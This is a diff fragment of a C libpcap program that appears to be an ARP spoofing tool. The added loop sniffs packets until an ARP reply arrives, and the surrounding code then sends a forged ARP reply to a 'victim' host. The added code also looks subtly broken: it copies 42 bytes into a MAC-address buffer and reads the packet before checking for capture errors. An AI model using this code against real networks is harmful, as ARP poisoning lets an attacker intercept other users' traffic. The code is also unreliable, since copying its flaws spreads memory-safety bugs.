@@ -145,8 +145,31 @@ int main(int argc, char* argv[])
 	};
 	
 	/*take target's mac address*/
-	
+	while(true){
+		printf("sniff....\n");
+		struct pcap_pkthdr* header;
+		const u_char* packet;
+		int res = pcap_next_ex(handle, &header,&packet);
+		for(int i=0;i<42;i++){
+			dest_mac[i] = packet[i];
+			printf("%02x ",packet[i]);
+		}
+		printf("\n");
+		if( res==0) continue;
+		if (res== -1||res==-2)break;;
+		uint8_t type[2]; 
+		uint8_t opcode[2];
+		type[0] = packet[12];
+		type[1] = packet[13];
+		opcode[0]=packet[20];
+		opcode[1]=packet[21];
 
+		if(type[0]==0x08 &&type[1]==0x06){ //is type == arp ?
+			if(opcode[0]==0x00 &&opcode[1]==0x02){//is opcode is reply?
+				break;
+			}
+		}	
+	}
 	/*send reply to victim*/
 	if(make_and_send_packet(handle,sender_mac,my_mac,target_ip,sender_ip,target_mac,0x0002)!=0){
 	printf("send reply packet failed!\n");
